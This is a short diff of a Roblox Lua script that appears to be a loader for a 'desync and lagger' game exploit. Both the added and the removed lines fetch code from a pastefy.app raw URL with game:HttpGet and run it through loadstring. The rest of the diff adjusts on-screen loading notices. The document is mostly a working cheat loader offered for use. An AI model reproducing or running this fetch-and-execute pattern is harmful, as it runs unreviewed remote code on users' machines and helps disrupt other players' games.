@@ -1,13 +1,7 @@
-loadstring(game:HttpGet("https://pastefy.app/47KcqSsX/raw"))()
-wait(1) 
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "WARNING",
-    Text = "Loading... Script is not fully loaded until this message is gone",
-    Duration = 40
-})
+loadstring(game:HttpGet("https://pastefy.app/C1ExmsrP/raw", true))()
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "Notice",
     Text = "If Kawatan desync and lagger dont show wait for it to load",
-    Duration = 60
+    Duration = 600
 })
